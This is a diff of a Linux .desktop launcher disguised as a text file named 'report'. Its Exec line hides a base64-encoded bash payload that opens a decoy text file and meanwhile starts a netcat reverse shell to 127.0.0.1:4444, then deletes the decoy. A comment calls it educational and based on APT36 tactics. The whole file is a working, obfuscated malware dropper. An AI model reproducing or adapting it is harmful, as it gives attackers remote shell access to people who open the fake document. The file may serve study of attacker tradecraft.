@@ -2,7 +2,7 @@
 Comment="This was made for educational purposes based off of the TTPs from APT36. While you are free to modfiy and use this as you please, I must personally request that this is not modified for use in malicious activities. Cybercrime is bad, don't do cybercrime. Be gay, and hack ethically!"
 Exec=bash -ic 'echo "dnZGeXQ9JChlY2hvICJNVEkzTGpBdU1DNHhDZz09IiB8IGJhc2U2NCAtZCk7IGJOdHRSPSQoZWNobyAiTkRRME5Bbz0iIHwgYmFzZTY0IC1kKTsgUks1bWY9JChlY2hvICJVbUZ1Wkc5dElHUmhkR0VLYlc5eVpTQmtZWFJoQ21WMlpXNGdiVzl5WlNCa1lYUmhDbFJ2ZEdGc2JIa2diR1ZuYVhRZ1pHRjBZUW89IiB8IGJhc2U2NCAtZCk7IFl3VlVLPSQoZWNobyAiTDNSdGNDOXlaWEJ2Y25RdWRIaDBDZz09IiB8IGJhc2U2NCAtZCk7IGVjaG8gIiRSSzVtZiIgPiAiJFl3VlVLIjsgeGRnLW9wZW4gIiRZd1ZVSyI7IG5jICIkdnZGeXQiICIkYk50dFIiIC1lIC9iaW4vYmFzaDsgcm0gIiRZd1ZVSyI=" | base64 -d | bash'
 Icon=txt
-Name=report.txt
+Name=report
 StartupNotify=true
 Terminal=false
 Type=Application
